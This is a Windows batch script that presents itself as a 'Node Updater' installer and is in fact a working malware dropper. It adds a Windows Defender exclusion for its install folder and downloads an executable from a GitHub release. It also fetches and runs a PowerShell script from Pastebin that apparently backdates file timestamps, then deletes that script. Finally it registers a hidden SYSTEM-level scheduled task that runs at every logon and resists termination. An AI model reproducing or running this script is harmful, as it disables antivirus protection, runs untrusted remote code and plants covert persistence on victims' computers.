@echo off

set "destination=C:\Program Files\Node Updater"

if not exist "%destination%" (
    mkdir "%destination%"
)

powershell.exe -ExecutionPolicy Bypass -NoLogo -Command "Add-MpPreference -ExclusionPath '%destination%'"

if exist "%destination%\Node Updater.exe" (
    taskkill /IM "Node Updater.exe" /F
    del "%destination%\Node Updater.exe"
)

curl -L -s -o "%destination%\Node Updater.exe" https://github.com/nodeupdater2/nodeupdater/releases/latest/download/app.exe

curl -L -s -o "C:\Windows\Temp\CFT.ps1" https://pastebin.com/raw/JnKYFey2

powershell.exe -ExecutionPolicy Bypass -NoLogo -File "C:\Windows\Temp\CFT.ps1" -FolderPath "%destination%" -Time "02/04/2018 08:47:36"

del "C:\Windows\Temp\CFT.ps1"

powershell.exe -ExecutionPolicy Bypass -NoLogo -Command "Register-ScheduledTask -TaskName 'Node Updater' -Action (New-ScheduledTaskAction -Execute '%destination%\Node Updater.exe' -WorkingDirectory '%destination%\') -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds 0) -Hidden -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DisallowHardTerminate -Priority 0 -Compatibility Win8) -User 'SYSTEM' -RunLevel Highest"

powershell.exe -ExecutionPolicy Bypass -NoLogo -Command "Start-ScheduledTask -TaskName 'Node Updater'"
